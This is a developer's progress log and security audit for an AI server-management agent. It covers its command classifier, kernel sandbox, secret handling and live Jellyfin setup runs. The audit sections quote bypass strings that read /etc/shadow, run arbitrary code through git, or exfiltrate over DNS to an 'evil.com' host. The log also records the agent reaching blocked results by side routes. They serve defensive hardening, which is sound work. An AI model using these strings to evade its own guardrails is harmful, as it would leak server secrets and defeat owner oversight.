  `touch /etc/x` is refused as `mutate`, `secret.key` is refused, `http_get` reads Jellyfin, and a
  six-second capture during two real requests decoded both the loopback and docker-bridge legs of
  `GET /System/Info/Public → 200 {"ProductName":"Jellyfin Server",…}`. Finding: under
  `--unshare-net` the sandbox has an *empty* network namespace, so `ip route` showed nothing -
  read-only inspection now runs in the host namespace by default (`isolateNetwork` opts out); the
  classifier keeps it read-only, egress-by-GET stays the accepted residual.

- **Step 6, `ask_user` + `system_plan` - done.** `agent/interaction-tools.ts`: batched intent
  questions (choices, free text, or a credential stored by reference - the value never returns to
  the model), and the one-approval system plan (findings / reuse-vs-install components / steps /
  verification / notes) with approve / change / cancel. `QuestionEvent.options` may be empty (free
  text); new `SystemPlanEvent`. The TUI now renders `operation_plan` (class, sandbox scope,
  warning, command, proposed file content), `operation_result`, and `system_plan` - it had never
  shown a plan before, only the confirm line.
- **Step 7, learn agent - done (live proof pending).** SDK: `ExtensionOperation` write bindings
  as data (`bind(args) → {kind, goal, …}` for `http_mutation` / `shell_command` / `file_write`),
  `ctx.exec` (classifier-gated, sandboxed, read-only) and `ctx.readFile` for CLI/config-file
  control methods, fakes for tests. Host: `operations.ts` loaded, `bind` RPC, sessions invalidated
  on promotion, exec/readFile implemented in the subprocess via the same classifier + sandbox
  (no reverse RPC). Validation dry-runs every no-arg binding through the real kind's `describe()`
  - a binding to `rm -rf` or a public URL fails at learn time. Manifest carries `operations`;
  `agent/extension-tools.ts` turns them into `ext_<app>_*` tools that bind in the host and run
  through the engine. Learn agent: discovery-ladder prompt, adaptive control method, outcome-shaped
  tools, credential autonomy, recursion (`app_learn` inside learning, `MAX_LEARN_DEPTH = 3`, cycle
  guard), `ask_user` during learning, operation tools for bootstrap writes, `capability_write` →
  Memory category `capability` (summarised into the system prompt as "Systems you already
  operate"). Hot-load: `app_learn` swaps the promoted extension's tools into the running agent and
  returns `addedToolNames`. Repair reports success so a failing call retries once inline.
- **Step 9, maturity - column only.** `extensions.successful_runs` (added defensively), reset on
  promotion, bumped on every successful call; `maturityOf()` derives `trusted` at 10 clean runs.
  Auto-approve policy consuming it waits for a slice where an app has actually earned it.
- **Step 10, the loop in the base prompt - done.** Inspect first → infer → ask intent only, in
  one batch → system plan → execute through operations → acquire capability on the unknown →
  verify the architecture → retain.
- **Root layout, a consequence found live:** as root, `Bun.WebView` fails ("Chrome process closed
  the pipe") - Chromium will not run as root without disabling its own sandbox. Resolution, not a
  re-decision: the extension host drops to an unprivileged user (`setpriv --reuid=miro`, env
  `MIRO_HOST_USER`) whenever the daemon is root, which also stops generated read-code from running
  as root. With that, a root daemon keeps state in `/var/lib/miro` and its socket at
  `/run/miro/mirod.sock` (group `miro`, 0660) so the owner's TUI connects; `resolveSocketPath()`
  finds it. `MIRO_DIR` / `MIRO_SOCKET` override both.

- **Chat model: Codex counts as connected.** The first acceptance run answered "I don't have an AI
  provider connected" - the root daemon had the Codex login but `pickDefaultModel` only ever
  considered the four API-key providers plus Ollama (which earlier runs reached through an SSH
  tunnel from the dev Mac). Inferred default, applied: a connected Codex login means the *chat*
  agent also runs `gpt-5.6-luna` at medium - the same standing preference as codegen, one rule,
  and Codex was added precisely because Ollama's cloud quota was too volatile to build on.
  Reflection uses the cheapest connected model, or Codex when it is the only one. Without Codex,
  cost-tier routing over the other providers is unchanged.

- **Step 11, first acceptance run - partial, and the review that followed.** One plain message
  ("can you set up jellyfin") to the root daemon: Miro inspected everything first, asked intent in
  one batch (correctly noticed no media exists), and called `app_learn` on its own. It also asked
  for the admin *password* three times, and the learn agent's four `extension_write` attempts all
  failed validation - the generated extension was good (five real write bindings) but its tests
  hit a TypeScript nit in the SDK's binding union, and `parameters` written as a plain object
  passed validation when it should not have. Fixed: `OperationBinding` is deliberately loose,
  validation checks every `parameters` is a real object schema, failures are logged, and
  `credential_create` makes credential creation mechanical (generated, stored by reference, shown
  to the owner once, never to the model). The plan trigger now fires before the first write of
  any setup request, single app or not.
- **Adversarial review (Opus, read-only) - 13 findings, all fixed and asserted in the corpus.**
  Critical ones: `awk '{print}' /etc/shadow` classified `read` (secret-path check ran after the
  interpreter branch); no path normalisation (`/etc//shadow`, `/proc/self/root/etc/shadow`);
  `nc`/public-URL fetches as `read` with the host network = free egress; `ip -b -` (batch mode);
  `kill -SIGKILL 1` via the flag-cluster matcher; `http.mutation` sending the secret header to
  unchecked `captureUrl`/`verifyUrl` and following redirects. Plus `ssh.socket` units, `git -C …
  clean`, `docker run -v /srv:… alpine rm`, `systemd-run`/`at`/`crontab` (execution outside the
  sandbox), exec wrappers (`flock`, `runuser`, `setpriv`, `script`, …), symlinked `file_write`
  targets, `>&file`, `truncate -s 0K`, `read_file /dev/zero`, no output redaction, and the
  sandbox lacking `--unshare-all`/`--cap-drop`. Now: `normalizePath` (aliases first, then
  normalise), a secret-path guard before any per-tool logic, `.ssh`/`.miro`/`/var/lib/miro`/
  credential files as secret material (with `authorized_keys`/`known_hosts`/`config` as lifeline
  writes), `needsNetwork` so only network-inspecting reads get the host namespace, `firstVerb()`
  for global-option-aware subcommands, `--unshare-all` + `--cap-drop ALL` for reads (a root payload
  cannot remount `/` rw - proven on the VM), `redirect: "manual"` everywhere, `realTarget()` in
  the file kinds, `redactSecretsInText` on every read path. Deliberately kept: a public `curl` is
  now a confirmed `mutate`, not refused - egress becomes visible, not impossible.
- **Self-assembling context - done.** `agent/context.ts`: every turn the agent is handed a map of
  itself - a cached (60s) server snapshot (host, containers, services of note, storage), the
  systems it already operates with their read/write tool names and maturity, and what is refused
  with the alternative - all read from the same stores the tools use, bounded in size; a
  `capabilities` tool returns full detail (descriptions, operational models, kinds, classes) on
  demand. A changed block rebuilds the agent like changed memory does.
- **Acceptance runs #2 and #3.** #2: streaming worked end to end, but the agent ended its turn
  asking questions in prose - the rule is now unambiguous (questions only via `ask_user`; a setup
  request runs until verified). #3: inspect → `app_learn` on its own → the learn agent drove the
  Jellyfin wizard through `http_mutation` operations (locale POST confirmed, applied, verified).
  Two findings, fixed mechanically: the learn agent never had `credential_create` (my filter
  passed only `ask_user`), so it minted a password with `shell_inspect` + `secret_store`; and it
  put that value literally in a request body, which the plan displayed - the kind guarded headers
  only. Now `{{secret:<ref>}}` placeholders in bodies/URLs/headers resolve at request time only,
  a literal credential in a body is refused, and the plan shows the placeholder.
- **Run #3 outcome, verified independently:** Jellyfin's own `/System/Info/Public` reports
  `StartupWizardCompleted: true`. Miro completed the first-run setup from a plain chat message
  with no user command - locale, first administrator (two wrong endpoint guesses each failed
  cleanly and rolled back before `POST /Startup/User` succeeded), remote access (a bad verify URL
  rolled back, then passed), `Startup/Complete` - every attempt a confirmed, verified operation
  in the operations table. It stalled minting an API key: `AuthenticateByName` needs Jellyfin's
  token-less `MediaBrowser Client=…` identification header (400 without it), the guard refused a
  literal `Authorization` header (correctly), and the browser fallback hung inside `navigate` on
  the SPA with no timeout on host calls. Fixed: host RPCs time out (120s, browser 60s), navigate
  settles or fails in 30s, the identification header is recognised as credential-free, and the
  Jellyfin golden hint now carries the whole auth sequence. `web_search` was unavailable the
  whole time - it needs `BRAVE_API_KEY`, an external credential the owner provides.
- **Client (in progress).** Protocol: structured `activity` (id/parent/status - a real tree),
  `reply_delta` streaming, `operation_progress`, `notice`, `question.timeoutMs`, `status.model`/
  `privilege`. `packages/ui-model`: the headless view-model (blocks, pending prompt, keymap,
  countdown, quiet-collapse) tested against a real turn's event sequence - the "one view-model,
  two thin renderers" decision made concrete. Renderer done (`apps/miro/src/App.tsx` is ~65
  lines holding one `UiState`; components under `components/` and `components/blocks/`; one
  palette in `theme.ts`, token names borrowed from opencode, values Miro's own). Live-smoked in
  tmux on the VM against the root daemon: status line (`home ● healthy · gpt-5.6-luna · root`),
  activity lines, streamed markdown reply, sticky prompt, footer hints. OpenTUI facts found on
  the way: `<diff>` needs an explicit height, `<input>` does not clear on submit, `usePaste`
  delivers bytes not text, `<select>`'s `onChange` fires on cursor movement (so the choice prompt
  is a highlighted row, not a select), and the `esc interrupt` hint has no protocol message
  behind it yet.
- **Run #4 (configured instance) - three real findings, all fixed (commit c4cf9fa).**
  (1) Generated `diagnostics.ts` returned `[{ tool: {...} }]`; the host expects plain tools, so
  the live probe died with `entry.tool.execute is not a function` three attempts in a row and the
  learn agent gave up. `host-entry.ts` now shape-checks every element of `buildTools` /
  `buildDiagnostics` / `buildOperations` and names the fix; the prompt says "plain object, never
  wrapped". (2) Both agents asked the user for the admin password Miro itself had created in run
  #3 - nothing listed the secret refs that exist. `listSecretRefs` now feeds a "Credentials on
  file" section into the context block and the learn prompt (refs only, never values; only
  `extension.*` refs, never Miro's own), and the learn prompt stores `admin_user` beside
  `admin_password` so both go into `{{secret:…}}` placeholders later. (3) The recreate-container
  operation rolled back with `bwrap: Can't find source path /home/miro: Permission denied` -
  inside a user namespace, a file owned by an unmapped uid is "nobody" and not even root may
  traverse another user's 0700 home. As real root the sandbox now runs without a user namespace
  (explicit `--unshare-ipc/pid/uts/cgroup-try` and `--unshare-net` unless declared); reads keep
  exactly `CAP_DAC_READ_SEARCH` (proven on the VM: `CapEff 0x4`, a 0600 file in the other user's
  home readable, writes and remount refused, own pid namespace); `keepCapabilities` as root is
  the named ceiling - a payload holding real `CAP_SYS_ADMIN` can remount, which a mount namespace
  never contained against a root that also holds the docker socket; Landlock is the second lock.
  Widening root reads to every home made a pre-existing hole matter: `grep -r x /root` never
  names `.ssh`. The classifier now refuses tree-walking readers (`grep -r`, `rg`/`ag`/`ack`,
  `tar c`, `find -exec`) rooted at or above `/`, `/home`, any home, `/root`, `/etc`, `/proc`,
  `/var/lib/miro`, whatever their class; `/etc/ssl/private` joined the secret paths. Not caught:
  `find /root -type f | xargs cat` - the pipe hands paths the classifier does not follow;
  `redactSecretsInText` is the last line there, noted in the code.
- **Run #5 (fresh install, the slice-1 bar)** against a recreated Jellyfin (empty config,
  `StartupWizardCompleted:false`) with Miro's jellyfin secrets, memories, and extension wiped
  first. No user prompt at all before the system plan - correct. Two more real findings (commit
  938dafe): (1) the learn agent wrote `bind: async (args) => ({...})` - natural next to an async
  `execute` - and the host did not await it, so every operation's dry run saw `{}` and failed
  with "binding must include kind and goal" on a file that plainly had both; three attempts
  gone, no extension. The host now awaits `bind`, and the prompt/SDK say it is synchronous data.
  (2) The main agent's own `http_mutation` for `POST /Startup/User` declared `expectStatus:
  [200]`; Jellyfin answered 204 and the kind reported "failed to apply" and rolled back - a
  false rollback of an admin account the server had in fact created. Any 2xx is now an applied
  write; `expectStatus` can only widen success (a 409 "already exists"), never narrow it. The
  golden hint records the 204s. **Outcome:** the setup itself succeeded end to end through the
  engine - wizard, admin via `credential_create`, container recreated with `/home/miro/media`
  mounted read-only (the root-sandbox fix, proven live), Movies and TV libraries, scan,
  capability document, `admin_user` + `admin_password` refs - and the reply to the user was the
  right one ("Done. Jellyfin is set up at …, admin `admin`, password shown once"). What did not
  happen: a promoted extension. The main agent invoked `app_learn` three times on its own; each
  session died on `tests.ts` type errors (arity of `bind()` on operations declared `bind: () =>`,
  fakes called without fixtures, a stray name). Root fix (commit c432685): the prompt requires
  `buildTools(ctx: ExtensionContext): ExtensionTool[]`-style annotated signatures - which also
  turns run #4's `{tool:…}` wrapper into a compile error - and args-taking binds; the SDK fakes
  default their fixtures. Third finding, a leak: `http_mutation`'s tool output carried the raw
  response body, so the learn agent read a session token out of `/Users/AuthenticateByName` and
  `secret_store`d it - the value passed through model context and the transcript. Bodies are
  redacted now, and the legitimate need has a mechanism: `storeResponseField { field, ref }`
  keeps a response field (a login's AccessToken, a minted key) straight in the store under an
  `extension.<app>.<name>` ref; the plan shows `field → ref`, the output the ref, and a missing
  field reports instead of rolling the write back. Real-server test covers store, missing field,
  and a refused non-extension ref.
- **Run #6 - the setup succeeded again, and exposed two engine-honesty bugs.** The final reply
  was right (Jellyfin configured, admin shown once, both libraries, media read-only, wizard
  verified), but the run thrashed for minutes first, and its learn session ran on a daemon that
  predated the app-relative-URL fix so it could never promote. Fixes (commits e46a1ee, 3613810):
  (1) An extension operation binding's URLs may be app-relative (`/Startup/User`), exactly like
  `ctx.http.get`; every absolute-URL refusal in the learn session was a relative path the model
  had every reason to write. `resolveBindingUrls` resolves them against the extension's base URL
  before the dry run and before the engine. (2) The bigger one: an irreversible POST that applied
  (2xx) but failed the agent's own `verify` was reported "rolled back" - a lie, because
  `http_mutation`'s rollback no-ops when there is no rollback request, so the write stayed on the
  server. Independent `GET`s confirmed the config and admin writes had landed while every step was
  reported rolled back; the agent then re-fought them (503 "server loading", 404, 405 as the
  wizard's state shifted under it). New terminal outcome `applied_unverified` (engine, protocol,
  ui-model, `OperationCard` ⚠, smoke): apply reached the server, verify did not confirm, nothing
  was undone - inspect before retrying. Reversible ops still roll back honestly, and an
  `applied_unverified` does not bump an extension's `successful_runs`. Also: `typecheckExtension`
  now quotes the offending source line (the retry never sees the discarded staging dir, and a
  bare "',' expected" cost attempts).
- **Run #7 (fresh install, every finding above fixed before the learn session even starts)** -
  setup succeeded through the honest `applied_unverified` path (each wizard step correctly reported
  "applied, verification did not confirm, not rolled back" instead of the old false rollback), but
  the extension still did not promote and the run thrashed on a 404.
- **Runs #7-#8 root cause - a real Jellyfin wizard quirk, now fixed in the golden hint.** Every
  run's setup thrash traced to one thing, verified by hand against a cold Jellyfin: **`POST
  /Startup/User` returns 404 unless a `GET /Startup/User` was issued first in the session** - the
  GET primes the route. POST-first 404s for 20s+ and never recovers; GET-then-POST returns 204 and
  creates the admin. The old hint's config→user order silently lost the admin, yet
  `/Startup/Complete` finalized the wizard anyway, so `AuthenticateByName` 401'd and the agent
  panic-asked the user for the credential it had just created. Also confirmed: every wizard POST
  needs `Content-Type: application/json` (else 415), the endpoints 404/503 while the server loads
  or just after a container restart, and the agent recreating the container mid-wizard (to add the
  media mount) is what re-triggered the load window. The golden hint now carries the exact ordered
  204 sequence, the GET-prime rule (set `captureUrl:"/Startup/User"` so the engine's pre-apply GET
  primes it), the content-type requirement, and "do container changes before the wizard". Verified
  end to end by hand: GET-prime → config → GET-prime → POST user (204) → RemoteAccess → Complete →
  AuthenticateByName (token) → authorized `/Library/VirtualFolders` (200), `StartupWizardCompleted:
  true`. This is the concrete instance of the "finicky app = a new navigation problem" critique:
  the fix was a verified golden hint, not more autonomy.
- **Audit + plan pass (2026-09-02).** After eight live runs the user called for a broad audit and
  an improvement plan, fanning out subagents. Six read-only auditors (opus on classifier/sandbox
  security, engine correctness, self-extension robustness; sonnet on secret-leak paths,
  protocol/ui-model/TUI, general code quality) sweep the codebase in parallel; findings synthesised
  into a prioritised plan. See §5.11 (below, once written).

### 5.9 Positioning (decided 2026-09-01)

Against "just point a generic privileged agent at the server" (`claude --remote-control` and the
like - very capable, root, no memory of this machine, no guardrails on it), the pitch leads with
**all four, plus open source**, in this order for an experienced self-hoster:

1. **Safe by construction.** Every write is classified, confirmed, kernel-sandboxed to a declared
   scope, verified, and rolled back on failure; `rm` does not exist; a lockout reverts itself.
   A generic agent with sudo has none of this on your server. A resident that cannot burn the
   house down.
2. **It knows *your* server and gets better.** Learned tools per app, a durable operational model,
   memory of you. Month two is one-tool-call territory; a generic agent starts from zero each time.
3. **Always there.** A daemon on the server, reachable over Iroh, re-probing and repairing on its
   own. Not a coding tool you sit at.
4. **Open source.** Inspectable guardrails are the only kind worth trusting with root.

### 5.10 First live result (before the redirect)

The initial read-only path was live-verified once: a real `jellyfin/jellyfin:latest` container on
the dev VM (blank install, wizard not completed), `learn jellyfin` driven over the real unix socket,
a valid extension promoted (`extensions` row `state=enabled, version=1`, files on disk, browser
session cleaned up). It generated three public, unauthenticated read tools - server info, branding,
startup configuration - and no libraries or sessions, because `http_probe` is GET-only and the
learn agent had no way to ask for or mint a credential on an instance with no admin user yet. That
finding is what surfaced the credential-bootstrap and control-method gaps in 5.3.

---

## Working notes / gotchas worth remembering across sessions

- **Bun global cache corruption** has happened twice this session - once on a fresh clone, once
  after a mid-session 1.3.14→1.4.0 upgrade. Symptom: packages install with only `package.json` +
  `README.md`, no real `dist`/source, despite `bun install` reporting success. Fix both times: `rm
  -rf node_modules ~/.bun/install/cache && bun install --force`. Check for this specifically after
  any future Bun version change, not just on first install.
- **This repo is not a git repository** (`git status` fails - no `.git` directory). Everything
  described here is uncommitted working tree state as of this writing.
- **`tools/dev-vm/` is dev-only, not shipped** - a disposable QEMU Debian 13 (arm64) VM used for
  every piece of live verification in this project (SSH bootstrap originally, now systemd operation
  testing). `up.sh`/`down.sh`/`ssh.sh`. Cloud-init only applies on a *fresh* disk - delete
  `tools/dev-vm/state/disk.qcow2` (not the downloaded base image) before `up.sh` to pick up
  cloud-init changes.
- **No Docker daemon reachable on this dev Mac** (binary present, daemon unreachable) and **no
  systemd/journalctl at all** on macOS - this is why systemd operation work specifically needed the
  VM to live-test; container work would need the same treatment when it comes up.
- This project insists on **live verification over self-reported success** throughout - every
  major piece of work in Parts 1-2 was proven against a real target (real systemd, real relay
  connection, real independent post-hoc verification via a separate SSH session), not just "tests
  pass." Keep doing this. **It keeps paying off**: Part 3's live VM run caught two real bugs (a
  TypeBox enum schema shape a real tool-calling model choked on; `spawnWorker` building its own
  provider registry and losing Ollama) that 100% passing unit tests and a clean `tsc --noEmit` both
  completely missed, because both bugs are about runtime behavior against a real external system
  (a real model's tool-calling, a dynamically-registered provider), not pure logic.
- **No `rsync` on this Mac.** Syncing source to the VM uses `tar czf` + `scp` + `tar xzf` instead.
  **Watch out**: macOS's `tar` embeds `._*` AppleDouble resource-fork sidecar files for every
  entry by default, and Bun's test runner picks those up as if they were the real file if their
  name happens to match a test glob (e.g. `._dreaming.test.ts` gets "run" and fails on binary
  garbage) - run `find . -name "._*" -delete` on the VM right after extracting, every time.
- **`rm -rf apps && tar xzf ...` on the VM also deletes `apps/*/node_modules`** (they're nested
  inside `apps/`, holding the workspace-hoist symlinks into `node_modules/.bun/`) - `bun install`
  alone won't recreate them if the lockfile didn't change (it reports "no changes" even though the
  symlinks are gone); use `bun install --force` after any resync that touched `apps/`.
- **SSH non-interactive commands don't source `~/.bashrc`** on the VM, so `bun`/`bunx` aren't on
  `PATH` unless every command explicitly does `export PATH="$HOME/.bun/bin:$PATH"` first - easy to
  forget and get a confusing "command not found" that looks like a broken install.
- **Compound SSH one-liners over this tool's SSH invocation intermittently return bare exit 255
  with zero output** (seen again this session, same as Stage A) - if that happens, don't debug the
  compound command itself; just split it into separate, simpler SSH invocations and it reliably
  works.
- **The `ssh -R <remote>:localhost:<local>` port-forward IS the Ollama bridge** used for every live
  test needing a real tool-calling model without a paid API key: the daemon runs on the VM, Ollama
  runs on this Mac, `registerOllamaIfReachable` only ever checks the daemon's own localhost, so the
  forward is what makes `localhost:11434` resolve to the real thing from the VM's side. That SSH
  session must stay foreground/alive for the whole test - backgrounding it kills the tunnel (and,
  since `mirod` is started via `nohup ... &` *inside* that same session, killing the tunnel also
  orphans-but-doesn't-kill `mirod` itself; check with `ps aux | grep bun` if a session died
  unexpectedly rather than assuming the daemon is gone).
- **Ollama's registered `:cloud` models share one account-level usage quota that is far more
  volatile than expected** - it refills briefly then exhausts again on the very next real request,
  repeatedly, not a hard monthly cap. Confirmed by directly curling `/api/chat` for each of the 3
  registered cloud models in turn during this session - all three shared the same exhausted state.
  Don't trust "it worked a minute ago" as a sign it'll work for a whole multi-turn live test; for
  anything that needs to reliably complete a long agentic run, use a genuinely local (non-`:cloud`)
  Ollama model or a real logged-in provider (see Codex, Part 4) instead of retrying cloud models.
- **`registerOllamaIfReachable` (`agent/ollama.ts`) hardcodes its 3 registered `:cloud` models** -
  it does not discover what's actually pulled via Ollama's own `/api/tags`. A newly `ollama pull`ed
  local model is invisible to the daemon until added to that literal list. Pre-existing since Stage
  A, only discovered this session because live-testing needed a non-cloud fallback.
- **No `sqlite3` CLI on the dev VM** - independently checking daemon DB state during a live test
  needs a one-line `bun -e` script using `bun:sqlite` directly (`new Database(process.env.HOME +
  "/.miro/miro.db")`), not the `sqlite3 ~/.miro/miro.db "select ..."` pattern used earlier stages'
  narratives assumed would work everywhere.
- **`pi-ai`'s own CLI (`dist/cli.js`, `bin: {"pi-ai": "dist/cli.js"}`) already has a `login
  <provider>` command**, including a device-code flow (`Select ... 2. Device code login (headless)`
  - pipe `"2"` as stdin non-interactively) for providers like `openai-codex` that need real browser
  OAuth. Genuinely useful for standing up a new provider login fast without writing any OAuth flow
  code - the credential lands in `./auth.json` (relative to wherever the CLI was invoked from) in
  pi-ai's own `{providerId: {type, access, refresh, expires, ...}}` shape, which matches pi-ai's
  `OAuthCredential` type exactly and can be handed straight to a `CredentialStore.modify()`. Treat
  that file as a real secret the moment it's written - move/import it and delete the original
  immediately, never leave it sitting in a repo directory.

### 5.11 Audit + hardening pass (2026-09-02)

After eight live acceptance runs the user called Miro "buggy out of its mind" and asked for a broad
audit + a plan to make it "the best software it can be," fanning out subagents. Six read-only
auditors (opus: classifier/sandbox security, engine correctness, self-extension robustness; sonnet:
secret-leak paths, protocol/ui-model/TUI, general code quality) swept the codebase in parallel. An
external reviewer's framing the user relayed: the safety/operation engine is the quietly-excellent
sellable pillar; autonomous self-extension is the flashy high-risk one - go hybrid, keep the
research loop that works, don't swing to fully hand-curated. The findings, in fix-priority tiers.
Each was verified by the auditor (many by running the actual pure functions); file:line included.

**Tier 0 - classifier secret-leak bypasses (the security moat; pure functions, test in the corpus).**
- C1 CRITICAL: relative `..` tokens bypass every `^/`-anchored sensitive rule - `cat
  ../../../../etc/shadow`, `base64 ../../../var/lib/miro/miro.db` classify `read` and (as root, with
  `CAP_DAC_READ_SEARCH`) leak. `normalizePath` returns any non-absolute path unchanged
  (classify.ts:353-354); `pathTokens`/`isSensitivePath` then never match. Fix: resolve tokens
  against `/` (or refuse a `..` segment) before matching; a `read` requires absolute, normalized
  path tokens.
- C2 CRITICAL: a glob metachar in a non-command arg dodges the literal sensitive match - `base64
  /etc/shado?`, `cat /home/miro/.ss?/id_rsa`. Only argv[0] sets `globInCommand` (classify.ts:256).
  Fix: a glob metachar in ANY arg demotes read→mutate (or expand-and-check).
- C3 HIGH: git transport/config subcommands are arbitrary exec still classed read - `git ls-remote
  'ext::sh -c ...'`, `git -c diff.external=... log -p`. Fix: reject `ext::`/`fd::` remotes and
  dangerous `-c` keys (classify.ts:833-851).
- C4 HIGH: `awk 'BEGIN{while((getline l < "/etc/shadow")>0)...}'` and `sed 'r /etc/shadow'` read
  secret files, classed read (the path is inside the program string, not a path token). Fix: awk
  `getline <` / sed `r|R|w|W` → not read.
- C5 HIGH: non-HTTP network readers reach public hosts - `dig X.evil.com`, `nc -z`, `ping -p` - a
  read that egresses, DNS-exfiltrating any literal in context. Only curl/wget check
  `isLocalOrPrivateUrl`. Fix: apply a local/private destination check to the other NETWORK_READERS.
- C6 LOW: `/proc/thread-self/environ` + `/proc/*/task/*/environ` not in the sensitive set (not
  currently reachable, close for consistency). C7: `redactSecretsInText` fails on encoded output and
  shadow lines - it is a backstop only; the structural fixes above are the real defense.

**Tier 1 - secret values reaching model context / logs / a third-party LLM.**
- L1 CRITICAL: apply-failure Error messages carry the raw response body / stderr unredacted
  (http-mutation.ts:175, shell-command.ts:81) → engine's `message` (engine.ts:150) → returned to the
  model un-redacted (operation-tools.ts spreads `result.message`), persisted plaintext in
  `operations.error` and as an `incident` memory row, and embedded verbatim in a Dreaming reflection
  prompt sent to a real provider (dreaming.ts:63). Fix: `redactSecretsInText` at each Error site.
- L2 CRITICAL: the `shell_command` WRITE branch returns raw stdout/stderr (operation-tools.ts:104) -
  every mutate/destructive shell command, unlike the read branch four lines up. Fix: redact both.
- L3 CRITICAL: extension tool/diagnostic results carry zero redaction, and generated code holds real
  `ctx.secrets` values (host-entry.ts:270, host.ts, extension-tools.ts:70). Fix: redact the returned
  value before it reaches the model.
- L4 HIGH: `redactSecretsInText` misses `cookie|jwt|session|bearer` (classify.ts:389). Fix: extend.
- L5 HIGH: `memory.remember()` has no redaction choke point; a value once in front of the model can
  be re-saved as a `preference`/`server_fact` and injected into every future turn. Fix: redact in
  `remember()` itself. H2: `capturedState` is persisted plaintext in the same DB as encrypted
  secrets; `chmod 0600` the DB + MIRO_DIR at boot.

**Tier 2 - durability / data-loss (engine + boot).**
- E1 HIGH: `reconcileOperations` ignores the persisted `op.plan`, so after a crash it re-runs the
  false-rollback for an irreversible op - the exact bug `applied_unverified` was built to kill, but
  the crash path has no such branch (engine.ts:248-253). Fix: read `op.plan`; irreversible + verify
  fail → commit, not rollback.
- E2 HIGH: same gap auto-commits an interrupted lifeline op, bypassing the reachability gate that
  exists to prevent locking the user out (engine.ts:245-247). Fix: lifeline + interrupted → roll
  back, never headless-commit.
- D1 HIGH data-loss: `/memory forget %` or an empty arg is a LIKE-wildcard wipe of ALL memory incl.
  capability docs, no undo (memory/store.ts:212). Fix: escape `%`/`_`, refuse empty/bare-wildcard.
- E3 MED: snapshot archive id `shell-${Date.now()}` collides for concurrent shell ops, so one op's
  rollback restores another's bytes (shell-command.ts:72). Fix: add a random suffix (trash.ts does).
- D2 HIGH leak/stuck-op: a dropped connection during any pending confirmation leaks the
  `pendingAnswers` closure forever and leaves the operation stuck "awaiting confirmation" in the DB;
  only lifeline has a timeout (index.ts close() is a no-op). Fix: settle all pendingAnswers on
  socket close (cancel sentinel); consider a timeout on op_confirm/ask.

**Tier 3 - client correctness (protocol / ui-model / TUI).**
- U1 CRITICAL: ui-model's single `pending` slot overwrites a still-open question - a lifeline
  countdown gets dropped from the UI and can never be answered; a non-lifeline orphan hangs the
  daemon turn forever. Fix: queue/keyed pending.
- U2 CRITICAL: nothing blocks a second `chat` mid-turn; the daemon dispatches `handleChat`
  un-awaited (index.ts:413) → two turns race on one ConnState. Fix: gate the input on `!working`
  and/or serialize per-connection.
- U3 HIGH: `reply_delta` reuses one block id across interleaved narration segments (seq not bumped)
  → duplicate React keys. U4 HIGH: no reconnect - a restarted daemon leaves the TUI silently
  "healthy" forever (connection.ts close/error are no-ops). U5 HIGH: client `JSON.parse` on one bad
  line is unguarded (connection.ts:52). Plus MED/LOW: unknown-id updates dropped silently; pending
  never cleared by its own deadline; unbounded transcript/createLineBuffer; the `esc interrupt` hint
  with nothing behind it; the outcome union hand-copied 3× instead of derived.

**Tier 4 - make self-extension actually promote (4 structural causes, not 8 bugs).**
- X1: the validator drip-feeds one error class per attempt (5 short-circuiting gates) inside a
  3-attempt budget - aggregate and return ALL independent failures at once (validate.ts:99-153).
- X2: each retry blind-rewrites all five files (staging discarded, prior code not echoed) - persist
  staging / allow changed-files-only / echo prior code so the model edits (learn-agent.ts:250-257).
- X3 (highest leverage, lowest cost): NO reference extension exists anywhere and the full
  `validateExtension` has ZERO test coverage - hand-author one correct extension (Gotify), check it
  in, prove the pipeline against it in a test, and paste it verbatim into the prompt as a worked
  example.
- X4: generated `tests.ts` is a redundant second codegen surface (its own failure class) that the
  live-probe + dry-run already cover - drop it from the gating set.
- X5 (design, defer): move codegen toward a mostly-declarative spec (tool = path+projection,
  operation = binding template) so TS syntax/type/import/async errors vanish as a category; keep
  freeform TS only for irregular reads. Verdict: hybrid, keep autonomous research, don't hand-curate
  everything. Browser/Bun.WebView is janky but only runs during research, never in promoted code -
  leave it.

**Tier 5 - hardening / consistency (lower severity).** shell_command/file_write have no
`{{secret:ref}}` mechanism or literal-credential guard, unlike http_mutation (asymmetric - H1);
`web_search` fetch has no timeout, hangs a turn (H3); no cancel ClientMessage / AbortController (the
`esc interrupt` gap - H4); no per-package tsconfig, so `tsc` checks the whole monorepo every time
(H5); inventory listServices/serviceLogs/detectGpus lack the unreachable-service try/catch their
siblings have; boot-order closes over not-yet-declared `db`/`secretStore` (TDZ one refactor away);
`applied_unverified` doesn't bump `successful_runs` (decide explicitly); a throwing
describe()/captureState leaves a phantom `planning` row with no terminal event.

**Execution order:** Tier 0 → Tier 1 (safety first; these are the sellable pillar and the classifier
ones are pure-function testable in the corpus with the auditor's exact exploit strings) → Tier 2 →
Tier 3 → Tier 4 (X3+X1+X4 to finally promote an extension) → Tier 5. Commit per tier at green
(bun test + tsc across packages); live-verify the leak fixes and the reconcile fixes on the dev VM.

### 5.12 Audit fixes - live verification (2026-09-02)

All six audit tiers plus the Jellyfin golden-hint fix were verified on the dev VM as root:

- **Run #9** (all fixes, corrected golden hint): the Jellyfin first-run wizard completed cleanly for
  the first time - no `POST /Startup/User` 404 loop (the GET-prime fix works), admin created via
  `credential_create`, both libraries created and verified, correct final reply. `applied_unverified`
  fired on genuinely-unconfirmable steps instead of false rollbacks. It also surfaced a regression:
  Tier 1's `chmod 700` on `MIRO_DIR` blocked the extension host (runs as the `miro` user, must
  traverse `MIRO_DIR/extensions`) → "Cannot find module tools.ts". Reverted the dir chmod (DB stays
  0600, secret.key 0600), fixed the VM's already-tightened dir, restarted.
- **Run #10** (H2 fixed): **the self-extension loop promoted an extension for the first time across
  every run this session** - `extension_write ok:true, version 1, 3 tools / 2 diagnostics / 2
  operations`; the aggregated validator and the removal of generated `tests.ts` did it. Verified
  independently against the daemon's on-disk state: `extensions` row `jellyfin` enabled v1, the three
  generated files + manifest on disk, a `jellyfin` capability document in memory, wizard completed.
- **Retained-capability follow-up** (a second, separate chat turn): "what libraries does jellyfin
  have, and is it healthy?" was answered using the hot-loaded `ext_jellyfin_*` tools directly
  (`list_media_libraries`, `reachable`, `list_active_sessions`) with NO learning phase - proving the
  thesis end to end: learn an app once, retain the capability, operate it on future requests in one
  shot. (One diagnostic tripped the inline repair loop and self-repaired, `repaired:true`.)
- Minor bug found and fixed live: `secret_store` doubled the `extension.<app>.` prefix when the model
  passed a full ref as the name; the tool now strips it (commit e342bd8).

